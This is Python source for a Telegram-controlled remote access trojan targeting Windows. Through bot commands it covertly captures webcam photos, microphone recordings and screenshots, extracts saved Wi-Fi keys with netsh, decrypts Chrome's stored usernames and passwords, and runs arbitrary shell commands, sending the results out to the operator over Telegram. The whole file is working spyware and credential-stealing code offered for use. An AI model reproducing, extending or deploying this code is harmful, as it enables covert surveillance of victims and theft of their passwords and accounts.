import os
try:
    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder
    from telebot import types
    from Crypto.Cipher import AES
    from datetime import timezone, datetime, timedelta
except:
    os.system('pip install requirements.txt')

bot_token = "ENTER_YOUR_BOT_TOKEN_HERE"
bot = telebot.TeleBot(token=bot_token,parse_mode=None)

#CAMERA
def camera():
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        for i in range(1):
            return_value, image = camera.read()
            cv2.imwrite('cam.png', image)
        del(camera)
    except:
        pass

#RECORD
def record():
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        import wavio as wv
        recording = sd.rec(int(10*44100),samplerate=44100, channels=2)
        sd.wait()
        write("recording.mp3", 44100, recording)
    except:
        pass

'''
def wifi_pass1():
    wifipass = open('wifipass.txt','w')
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                wifipass.write("{:<30}|  {:<}".format(i, results[0]))
                wifipass.write("\n")
            except IndexError:
                wifipass.write("{:<30}|  {:<}".format(i, ""))
                wifipass.write("\n")
        except subprocess.CalledProcessError:
            pass
'''

#WIFI PASSWORD
def wifi_pass():
    wifipass = open('wifipass.txt','w')
    os.system('netsh wlan show profiles >> temp.txt')
    data = open('temp.txt','r').read().replace('''
Profiles on interface WiFi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
 ''',' ').replace("\n",'')
    profiles = data.split('    All User Profile     : ')
    os.remove('temp.txt')
    for i in profiles:
        os.system('netsh wlan show profiles '+i+' key=clear | findstr Key >> temp.txt')
        results = open('temp.txt','r').read().replace('''Key Content            : ''','##').replace('\n','').replace('    ','').split('##')
        wifipass.write("{:<30}|  {:<}".format(i, str(results[len(results)-1])))
        wifipass.write("\n")
    os.remove('temp.txt')



#CHROME PASSWORD
def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]

def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords(logged in with Social Account)"

def chrome_password():
    chromepass = open('chromepass.txt','w')
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(password_db_path,"my_chrome_data.db")
    db = sqlite3.connect("my_chrome_data.db")
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
    encp_key = encryption_key()
    chromepass.write("\n"+"-"*50+"\n")
    for row in cursor.fetchall():
        site_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], encp_key)
        date_created = row[3]
        if username or password:
            chromepass.write("Site Login URL: "+site_url+'\n')
            chromepass.write("Username/Email: "+username+'\n')
            chromepass.write(f"Password: "+password+'\n')
        else:
            continue
        if date_created:
            chromepass.write("Date date_created: "+str(my_chrome_datetime(date_created)))
        chromepass.write("\n"+"-"*50+"\n")
    cursor.close()
    db.close()
    os.remove("my_chrome_data.db")

#SCREENSHOT
def screenshoot_click():
    try:
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save('ss.png')
    except:
        pass

#-----------------------------------------------------------------------------------------------------------------#

#                      START

try:
  @bot.message_handler(commands=['start', 'help'])
  def handle_start_help(message):
    markup = types.ReplyKeyboardMarkup(row_width=1)
    itembtn1 = types.KeyboardButton('Cam')
    itembtn2 = types.KeyboardButton('Shell')
    itembtn3 = types.KeyboardButton('Record')
    itembtn4 = types.KeyboardButton('wifipass')
    itembtn5 = types.KeyboardButton('screenshot')
    itembtn6 = types.KeyboardButton('chromepass')
    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6)
    bot.send_message(message.from_user.id,message.text, reply_markup=markup)
except:
    pass

#                      COMMANDS

try:
  @bot.message_handler(func=lambda message: True)
  def message_handel(message):

    #CAMERA
    try:
      if str(message.text).lower() == 'cam':
        bot.send_message(message.from_user.id, 'Processing command "Cam", Please wait...')
        camera()
        photo = open('cam.png', 'rb')
        bot.send_photo(message.from_user.id, photo)
        photo.close()
        if os.path.exists("cam.png"):
            os.remove("cam.png")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #RECORDING
    try:
      if str(message.text).lower() == 'record':
          bot.send_message(message.from_user.id, 'Processing command "Record", Please wait...')
          record()
          recording = open('recording.mp3', 'rb')
          bot.send_voice(message.from_user.id, recording)
          recording.close()
          if os.path.exists("recording.mp3"):
              os.remove("recording.mp3")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #CHROME PASSWORD
    try:
      if str(message.text).lower() == 'chromepass':
        bot.send_message(message.from_user.id, 'Processing Chrome Passwords, Please wait...')
        chrome_password()
        chrome_pass = open('chromepass.txt', 'rb')
        bot.send_document(message.from_user.id, chrome_pass)
        chrome_pass.close()
        if os.path.exists("chromepass.txt"):
            os.remove("chromepass.txt")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #SCREENSHOT
    try:
      if str(message.text).lower() == 'screenshot':
        bot.send_message(message.from_user.id, 'Capturing Screenshot, Please wait...')
        screenshoot_click()
        photo = open('ss.png', 'rb')
        bot.send_photo(message.from_user.id, photo)
        photo.close()
        if os.path.exists("ss.png"):
            os.remove("ss.png")
    except:
        bot.send_message(message.from_user.id, 'Error!')

    #WIFI PASSWORD
    if str(message.text).lower() == 'wifipass':
        bot.send_message(message.from_user.id, 'Capturing Wifi Passwords, Please wait...')
        wifi_pass()
        wifi_pass_open = open('wifipass.txt', 'rb')
        bot.send_document(message.from_user.id, wifi_pass_open)
        wifi_pass_open.close()
        if os.path.exists("wifipass.txt"):
            os.remove("wifipass.txt")

    #Shell
    try:
      if 'shell' in str(message.text).lower():
        if 'shell' == str(message.text).lower():
          bot.send_message(message.from_user.id, 'Type in the following order ->  shell "you_command"')
        else:
            if ' >> ' in message.text:
                os.system(str(message.text)[6:])
                shell = open(str(message.text)[6:].split(' >> ')[1], 'rb')
                bot.send_document(message.from_user.id, shell)
                shell.close()
                if os.path.exists(str(message.text)[6:].split(' >> ')[1]):
                    os.remove(str(message.text)[6:].split(' >> ')[1])
            else:
                os.system(str(message.text)[6:])
    except:
        bot.send_message(message.from_user.id, 'Error!')
except:
    pass


bot.polling()
